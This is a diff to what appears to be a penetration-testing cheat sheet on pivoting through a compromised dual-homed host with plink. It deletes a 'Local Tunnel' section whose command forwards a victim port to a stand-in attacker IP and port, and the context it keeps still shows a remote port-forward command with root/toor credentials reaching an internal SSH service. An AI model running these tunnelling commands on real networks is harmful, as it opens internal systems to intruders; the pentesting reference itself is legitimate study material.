@@ -224,21 +224,6 @@ for example, suppose you have gained access at a dual-homed host and using this 
 
 `cmd.exe /c echo y | plink.exe -ssh -l root -pw toor -R 13.13.13.13:2222:10.10.10.10:22 13.13.13.13`
 
-### Local Tunnel
-
-If you don't want to do an SSH remote port forwarding, but a local one instead:
-
-```
-cmd.exe /c echo y | plink.exe -ssh -l root -pw toor -R [attacker_ip]:[attacker_port]:127.0.0.1:[victim_port] [attacker_ip]
-```
-
-The above command will forward the local `victim_port` at the host that you have access to, to your `attacker_ip`:`attacker_port`
-
-In the commands above, the `cmd.exe /c echo y |` part can be ommited if you have previously accepted the server SSH certificate.
-
-For the above to work, you need the following configuration at your SSH server:
-`GatewayPorts yes`
-
 ### Plink Troubleshooting
 
 * Check if architecture of plink and target system are compitable (32 bit & 64 bit).
